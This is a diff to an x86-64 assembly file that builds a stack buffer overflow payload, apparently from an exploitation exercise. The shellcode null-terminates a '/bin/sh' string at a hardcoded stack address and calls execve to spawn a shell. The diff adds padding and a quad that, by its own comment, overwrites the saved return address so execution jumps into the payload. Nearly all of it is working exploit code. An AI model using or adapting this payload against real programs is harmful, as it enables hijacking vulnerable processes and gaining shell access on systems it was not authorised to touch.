@@ -8,13 +8,15 @@
         .type   main, @function
 
 main:
-        .ascii   "aaaa"
+
         xor     %rcx, %rcx
         xor     $0x7fff, %cx
         shl     $32, %rcx
         xor     $0xffffdf50, %ecx        /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
-        movq     %rcx, 8(%rcx)           /* Ptr to ['/bin/sh'] */
+        xor     %al, %al
+        mov     %al, 8(%rcx)             /* Add '\0' to "/bin/sh" */
+        movq    %rcx, 9(%rcx)           /* Ptr to ['/bin/sh'] */
 
         mov     $59, %al                 /* syscall arg 1: syscall number execve(59) */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
@@ -27,5 +29,6 @@ main:
         xorq    %rdi,%rdi                /* syscall arg 2: 0 */
         syscall                          /* invoke syscall */
 
-        .ascii  "/bin/sh\0"
-        .quad   0x0
+        .ascii  "/bin/sh"
+        .ascii  "aaaa"
+        .quad   0x7fffffffdee0           /* buffer ptr (the first instruction of payload), will overwrite real return address */
